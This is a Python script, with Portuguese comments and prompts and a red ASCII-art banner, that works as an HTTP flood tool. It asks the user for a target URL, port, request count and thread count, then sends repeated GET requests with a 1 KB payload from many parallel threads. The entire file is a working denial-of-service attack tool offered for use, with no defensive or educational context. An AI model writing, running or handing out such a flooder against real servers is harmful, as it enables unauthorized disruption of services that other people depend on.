import requests
import threading
from colorama import init, Fore, Style
import os



init()
intro = f"""{Fore.RED}
            | $$  | $$| $$$ | $$ /$$$$$$$           | $$        
            | $$  | $$| $$$$| $$| $$  \ _/  /$$$$$$ | $$        
            | $$$$$$$$| $$ $$ $$| $$ /$$$$ /$$__  $$| $$        
            |_____  $$| $$  $$$$| $$|_  $$| $$$$$$$$| $$        
                  | $$| $$\  $$$| $$  \ $$| $$_____/| $$        
                  | $$| $$ \  $$|  $$$$$$/|  $$$$$$$| $$$$$$$$  
                  |__/|__/  \__/ \______/  \_______/|________/ BETA
{Style.RESET_ALL}"""


print(intro)


print("\033[91m") 


# Função para enviar solicitações HTTP GET em um loop com payload
def flood(url, port, num_requests, payload):
    for _ in range(num_requests):
        try:
            response = requests.get(f"{url}:{port}", params={'data': payload})
            print(f"Solicitação enviada para {url}:{port}, Status: {response.status_code}")
        except Exception as e:
            print(f"Erro ao enviar solicitação para {url}:{port}: {e}")

# Função principal
def main():
    url = input("Insira o URL alvo: ")
    port = input("Insira a porta para se comunicar: ")
    num_requests = int(input("Insira o número de solicitações a serem enviadas por thread: "))
    num_threads = int(input("Insira o número de threads: "))
    
    # Criar um payload com dados significativos em bytes (exemplo: 1 KB)
    payload_size = 1024  # 1 KB
    payload = 'a' * payload_size  # Payload de 1 KB de 'a'

    # Criar threads para enviar solicitações em paralelo
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=flood, args=(url, port, num_requests, payload))
        threads.append(thread)
        thread.start()

    # Aguardar todas as threads concluírem
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()

